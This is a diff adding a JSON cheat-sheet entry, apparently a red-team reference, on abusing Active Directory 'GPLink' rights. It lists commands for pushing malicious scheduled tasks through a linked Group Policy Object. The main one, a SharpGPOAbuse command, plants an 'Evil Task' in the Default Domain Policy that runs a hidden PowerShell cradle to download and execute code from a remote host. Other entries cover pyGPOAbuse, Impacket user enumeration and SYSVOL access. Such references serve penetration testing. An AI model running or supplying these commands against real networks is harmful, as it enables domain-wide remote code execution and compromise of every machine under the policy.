@@ -1,0 +1,75 @@
+{
+    "GPLink": {
+        "meaning": "A linked GPO applies its settings to objects in the linked container. The GPLink relationship connects a Group Policy Object (GPO) to an AD domain or organizational unit (OU) it is linked to.",
+        "common": "",
+        "windows": {
+            "SharpGPOAbuse": [
+                {
+                    "order": 1,
+                    "command": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Evil Task\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.1:80/a'))\\\"\" --GPOName \"Default Domain Policy\"",
+                    "description": "Add malicious scheduled task to linked GPO"
+                }
+            ],
+            "GroupPolicy": [
+                {
+                    "order": 1,
+                    "command": "gpmc.msc",
+                    "description": "Open Group Policy Management Console"
+                },
+                {
+                    "order": 2,
+                    "command": "# Navigate to GPO -> Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks",
+                    "description": "Navigate to scheduled tasks in GPO editor"
+                },
+                {
+                    "order": 3,
+                    "command": "# Create new scheduled task with malicious payload",
+                    "description": "Create malicious scheduled task through GUI"
+                }
+            ],
+            "PowerShell": [
+                {
+                    "order": 1,
+                    "command": "Import-Module GroupPolicy",
+                    "description": "Import Group Policy PowerShell module"
+                },
+                {
+                    "order": 2,
+                    "command": "Get-GPO -Name \"Default Domain Policy\" | Get-GPOReport -ReportType Html -Path \"C:\\temp\\gpo_report.html\"",
+                    "description": "Generate GPO report to understand current settings"
+                },
+                {
+                    "order": 3,
+                    "command": "# Modify GPO settings programmatically",
+                    "description": "Modify GPO settings using PowerShell cmdlets"
+                }
+            ]
+        },
+        "linux": {
+            "pyGPOAbuse": [
+                {
+                    "order": 1,
+                    "command": "python3 pyGPOAbuse.py DOMAIN/user:password@domain-controller -gpo-id \"{GPO-GUID}\" -f",
+                    "description": "Abuse GPO from Linux using pyGPOAbuse"
+                }
+            ],
+            "Impacket": [
+                {
+                    "order": 1,
+                    "command": "python3 GetADUsers.py -all DOMAIN/USER:PASSWORD@DC_IP -outputfile users.txt",
+                    "description": "Enumerate domain users affected by GPO"
+                },
+                {
+                    "order": 2,
+                    "command": "smbclient.py DOMAIN/USER:PASSWORD@DC_IP",
+                    "description": "Connect to SYSVOL share to access GPO files"
+                },
+                {
+                    "order": 3,
+                    "command": "# Navigate to \\\\domain.com\\SYSVOL\\domain.com\\Policies\\{GPO-GUID}\\",
+                    "description": "Access GPO directory structure on SYSVOL"
+                }
+            ]
+        }
+    }
+}
